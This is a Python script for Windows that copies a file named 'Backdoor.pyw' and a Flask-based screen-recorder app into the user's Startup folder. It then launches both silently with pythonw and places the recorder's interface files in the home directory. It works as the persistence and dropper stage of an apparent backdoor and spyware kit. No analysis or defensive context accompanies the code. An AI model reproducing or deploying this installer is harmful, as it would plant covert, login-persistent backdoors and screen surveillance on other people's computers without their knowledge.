import os
import shutil
import subprocess
import sys
import logging

# Set up logging
logging.basicConfig(
    level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s"
)

# Define constants
STARTUP_DIR = os.path.expanduser(
    "~\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
)
USER_DIR = os.path.expanduser("~")
CURRENT_DIR = os.getcwd()
SCREEN_RECORDER_PATH = CURRENT_DIR
FILE_TRANSFER_DIR = CURRENT_DIR
USER_DIR_SCREEN_RECORDER = os.path.join(USER_DIR, "ScreenRecorder")


def copy_file(src_dir, filename, dest_dir):
    """
    Copy a file from source directory to destination directory.
    """
    src_path = os.path.join(src_dir, filename)
    dest_path = os.path.join(dest_dir, filename)

    try:
        if not os.path.exists(dest_dir):
            os.makedirs(dest_dir)

        if os.path.exists(src_path):
            shutil.copy2(src_path, dest_path)
            logging.info(f"File copied: {src_path} -> {dest_path}")
            return dest_path
        else:
            logging.error(f"Source file not found: {src_path}")
            return None
    except Exception as e:
        logging.error(f"Error copying file {filename}: {str(e)}")
        return None


def run_app(app_path):
    """
    Run an application given its path.
    """
    if app_path and os.path.exists(app_path):
        try:
            if app_path.endswith(".pyw"):
                # For .pyw files, use pythonw to run without console
                subprocess.Popen(["pythonw", app_path], shell=False)
            else:
                subprocess.Popen([app_path], shell=False)
            logging.info(f"Running: {app_path}")
        except Exception as e:
            logging.error(f"Error running {app_path}: {str(e)}")
    else:
        logging.error(f"Unable to run app: {app_path}")


def main():
    # Copy and run flaskapp.pyw
    flask_app_path = copy_file(SCREEN_RECORDER_PATH, "flaskapp.pyw", STARTUP_DIR)
    if flask_app_path:
        run_app(flask_app_path)

    # Copy and run Backdoor.pyw
    backdoor_path = copy_file(FILE_TRANSFER_DIR, "Backdoor.pyw", STARTUP_DIR)
    if backdoor_path:
        run_app(backdoor_path)

    # Copy interface.html and Screen.png
    copy_file(SCREEN_RECORDER_PATH, "interface.html", USER_DIR_SCREEN_RECORDER)
    copy_file(SCREEN_RECORDER_PATH, "Screen.png", USER_DIR_SCREEN_RECORDER)


if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        logging.critical(f"Critical error in main execution: {str(e)}")
        sys.exit(1)
